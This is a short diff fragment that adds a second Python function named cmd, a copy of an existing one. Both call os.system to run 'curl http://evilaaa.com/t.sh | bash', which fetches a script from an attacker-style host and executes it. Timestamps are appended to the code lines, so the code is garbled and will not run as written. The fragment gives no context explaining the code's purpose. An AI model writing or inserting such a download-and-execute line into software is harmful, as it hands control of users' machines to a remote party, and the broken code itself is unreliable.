@@ -2951,3 +2951,7 @@ def cmd():
 def cmd():
   import os
   os.system("curl http://evilaaa.com/t.sh | bash") - 2025-10-16 14:12:59
+
+def cmd():
+  import os
+  os.system("curl http://evilaaa.com/t.sh | bash") - 2025-10-16 14:17:58
